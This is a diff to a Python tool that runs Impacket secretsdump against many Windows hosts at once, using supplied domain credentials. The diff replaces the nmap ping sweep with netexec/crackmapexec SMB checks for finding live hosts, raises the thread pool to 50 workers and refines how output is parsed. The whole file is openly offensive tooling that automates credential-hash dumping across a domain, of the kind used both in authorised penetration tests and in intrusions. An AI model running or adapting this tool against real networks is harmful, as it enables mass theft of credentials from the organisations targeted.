@@ -16,7 +16,7 @@ def is_valid_hostname(hostname):
     return re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.-]{1,253}[a-zA-Z0-9]$', hostname) is not None
 
 def resolve_hostnames(hosts, name_server):
-    resolved_hosts = []
+    resolved_hosts = {}
     resolver = dns.resolver.Resolver()
     resolver.nameservers = [name_server]
     
@@ -24,7 +24,7 @@ def resolve_hostnames(hosts, name_server):
         try:
             answers = resolver.resolve(host, 'A')
             for rdata in answers:
-                resolved_hosts.append(rdata.address)
+                resolved_hosts[host] = rdata.address
                 logging.debug(f"Resolved hostname: {host} -> {rdata.address}")
                 break
         except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
@@ -32,39 +32,62 @@ def resolve_hostnames(hosts, name_server):
     
     return resolved_hosts
 
-def check_live_hosts(hosts):
+def check_live_hosts(target_file):
+    from shutil import which
+    import re
+    import subprocess
+
+    def is_tool_installed(tool_name):
+        return which(tool_name) is not None
+
+    def run_netexec(target_file):
+        try:
+            result = subprocess.run(['nxc', 'smb', target_file], capture_output=True, text=True)
+            logging.info(f"Netexec output: {result.stdout}")
+            return result.stdout
+        except Exception as e:
+            logging.error(f"Netexec failed: {e}")
+            return None
+
+    def run_crackmapexec(target_file):
+        try:
+            result = subprocess.run(['crackmapexec', 'smb', target_file], capture_output=True, text=True)
+            logging.info(f"Crackmapexec output: {result.stdout}")
+            return result.stdout
+        except Exception as e:
+            logging.error(f"Crackmapexec failed: {e}")
+            return None
+
+    if is_tool_installed('nxc'):
+        logging.info("Using Netexec for SMB check")
+        output = run_netexec(target_file)
+        if output is None:
+            logging.error("Netexec failed")
+            return []
+    elif is_tool_installed('crackmapexec'):
+        logging.info("Netexec not found, falling back to Crackmapexec")
+        output = run_crackmapexec(target_file)
+        if output is None:
+            logging.error("Crackmapexec failed")
+            return []
+    else:
+        logging.error("Neither Netexec nor Crackmapexec is installed. Please install one of these tools.")
+        print("[!] Error: Neither Netexec nor Crackmapexec is installed. Please install one of these tools.")
+        return []
+
     live_hosts = []
-    try:
-        with open("temp_hosts.txt", "w") as temp_file:
-            for host in hosts:
-                temp_file.write(f"{host}\n")
-        
-        logging.debug(f"Hosts written to temp_hosts.txt: {hosts}")
+    fqdn_map = {}
+    with open(target_file, 'r') as f:
+        for line in f:
+            fqdn = line.strip()
+            fqdn_map[fqdn.split('.')[0].upper()] = fqdn
 
-        cmd = [
-            "nmap", "-sn", "-iL", "temp_hosts.txt", "--min-hostgroup", "255",
-            "--min-rtt-timeout", "0ms", "--max-rtt-timeout", "100ms", "--max-retries", "1",
-            "--max-scan-delay", "0", "--min-rate", "2000"
-        ]
-
-        logging.debug(f"Running nmap command: {' '.join(cmd)}")
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        logging.debug(f"Nmap command output: {result.stdout}")
-        logging.debug(f"Nmap command error: {result.stderr}")
-
-        if result.returncode == 0:
-            output = result.stdout.splitlines()
-            for line in output:
-                if "Nmap scan report for" in line:
-                    parts = line.split()
-                    if len(parts) >= 5:
-                        live_host = parts[4]
-                        live_hosts.append(live_host)
-        else:
-            logging.error(f"Nmap scan failed: {result.stderr}")
-    finally:
-        if os.path.exists("temp_hosts.txt"):
-            os.remove("temp_hosts.txt")
+    for line in output.splitlines():
+        if '445' in line and 'SMB' in line:
+            parts = re.split(r'\s+', line)
+            hostname = parts[3] if parts[3] != '445' else None
+            if hostname and hostname.upper() in fqdn_map:
+                live_hosts.append(fqdn_map[hostname.upper()])
 
     return live_hosts
 
@@ -84,17 +107,25 @@ def run_secretsdump(host, domain, username, password, output_dir):
     logging.debug(f"Command executed: {' '.join(cmd)}")
     logging.debug(f"Command output: {result.stdout}")
     logging.debug(f"Command error: {result.stderr}")
+    
+    # Filter out the "Cleaning up..." message
+    filtered_stdout = "\n".join([line for line in result.stdout.splitlines() if "Cleaning up..." not in line])
+    filtered_stderr = "\n".join([line for line in result.stderr.splitlines() if "Cleaning up..." not in line])
+    
     error_message = None
-    if "[-] RemoteOperations failed:" in result.stdout or "[-] RemoteOperations failed:" in result.stderr:
-        error_output = result.stderr if "[-] RemoteOperations failed:" in result.stderr else result.stdout
+    if "[-] RemoteOperations failed:" in filtered_stdout or "[-] RemoteOperations failed:" in filtered_stderr:
+        error_output = filtered_stderr if "[-] RemoteOperations failed:" in filtered_stderr else filtered_stdout
         error_message = error_output.split("[-] RemoteOperations failed:")[1].strip()
+    
     if error_message:
         logging.error(f"[!] Secretsdump against {host} failed: {error_message}")
         return f"[!] Secretsdump against {host} failed: {error_message}"
     elif result.returncode == 0:
+        logging.info(f"[+] Secretsdump against {host} complete -> See output directory for results.")
         return f"[+] Secretsdump against {host} complete -> See output directory for results."
     else:
-        return f"[!] Secretsdump against {host} failed: {result.stderr.strip()}"
+        logging.error(f"[!] Secretsdump against {host} failed: {filtered_stderr.strip()}")
+        return f"[!] Secretsdump against {host} failed: {filtered_stderr.strip()}"
 
 def main():
     parser = argparse.ArgumentParser(description="Perform multithreaded Secretsdump against live hosts")
@@ -145,17 +176,19 @@ def main():
         logging.error("[!] Hostname resolution failed!")
         sys.exit(1)
     
-    print("[+] Finding live hosts...")
-    live_hosts = check_live_hosts(resolved_hosts)
+    print("[+] Checking live hosts...")
+    live_hosts = check_live_hosts(args.target_file)
     if not live_hosts:
         print("[!] Error: No live hosts detected!")
         logging.error("[!] No live hosts detected!")
         sys.exit(1)
-    logging.info(f"[+] Live hosts detected: {', '.join(live_hosts)}")
+    else:
+        print(f"Successfully found {len(live_hosts)} live SMB hosts...")
+    logging.info(f"[+] Live SMB hosts detected: {', '.join(live_hosts)}")
 
     if live_hosts:
         with tqdm(total=len(live_hosts), desc="Performing secretsdump", unit="host") as pbar:
-            with concurrent.futures.ThreadPoolExecutor() as executor:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                 future_to_host = {executor.submit(run_secretsdump, host, args.domain, args.username, args.password, output_dir): host for host in live_hosts}
                 for future in concurrent.futures.as_completed(future_to_host):
                     host = future_to_host[future]
@@ -172,7 +205,7 @@ def main():
                         print(error_msg, file=sys.stderr)
                         logging.error(error_msg)
                     pbar.update(1)
-                executor.shutdown(wait=False)
+            executor.shutdown(wait=False)
 
 if __name__ == "__main__":
     main()
